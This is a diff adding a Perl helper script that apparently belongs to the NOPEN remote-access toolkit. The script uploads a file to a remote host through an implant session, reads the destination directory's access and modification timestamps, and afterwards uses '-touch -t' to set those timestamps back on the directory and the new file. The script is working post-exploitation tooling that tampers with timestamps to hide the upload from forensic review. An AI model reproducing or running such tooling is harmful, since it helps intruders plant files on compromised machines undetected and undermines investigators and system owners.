@@ -1,0 +1,74 @@
+#!/usr/bin/env perl
+## NOPEN autoport script to upload a file, preserving the 
+## mtime/atime stamps of the destination directory with
+## -ls -n and -touch -t.
+$VER="1.0.0.3" ;
+#use File::Basename qw(basename dirname);
+use File::Basename ;
+myinit() ;
+#############################
+# Get timestamps for $destdir
+#############################
+($output,$nopenlines,@output) = doit("-ls -nd $destdir");
+# -ls -n now prints out extra comment lines, but they are in $output[1+]
+$touchback = $output[0];
+mydie("Error: -ls -n produced invalid output")
+  unless ($touchback =~ /^-touch -t \d+:\d+\s+$destdir$/);
+($output,$nopenlines,@output) = doit("-ls -d $destdir");
+mydie("Error: $destdir is a link elsewhere. Use full Path for destination.")
+  if ($output =~ /^l/);
+#############################
+# Upload file
+#############################
+($output,$nopenlines,@output) = doit("-put $sourcefile $destfile $mode");
+#############################
+# Touch back time on both file and dir
+#############################
+$touchbackfile = $touchback . "/" . basename $destfile ;
+($output,$nopenlines,@output) = doit($touchbackfile,$touchback);
+
+
+sub myinit {
+  $willautoport=1;
+  require "../etc/autoutils" ;
+  $prog = "-gs tput" ;
+  $ext = "$$";
+  $vertext = "$prog version $VER\n" ;
+  die("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog);
+  mydie("bad option(s)") if (! Getopts( "hv" ) ) ;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog locfile remfile [mode]
+
+$prog uses -ls -n to save the mtime and atime timestamps on the directory
+into which the file is being uploaded, then -touch -t later to put those
+timestamps back.
+
+OPTIONS
+
+  -h       show this usage statement
+
+";
+  usage() if ($opt_h or $opt_v or !$ARGV[0]) ;
+  progprint("\n\n\nCalled as: $0 $gsoptions\n\n",$COLOR_FAILURE);
+  # make sure ARGV is healthy
+  ($sourcefile,$destfile,$mode,$error) = @ARGV;
+  usage("$prog requires two or three arguments")
+    if ($error or !$destfile or !$sourcefile);
+  mydie("Invalid mode")
+    if ($mode and !($mode =~ /^[0-7]{3,4}$/));
+  mydie("Local file $sourcefile not found")
+    unless (-e $sourcefile and -r _);
+  $destdir = dirname($destfile);
+  $socket = pilotstart(quiet);
+}#myinit
+
+
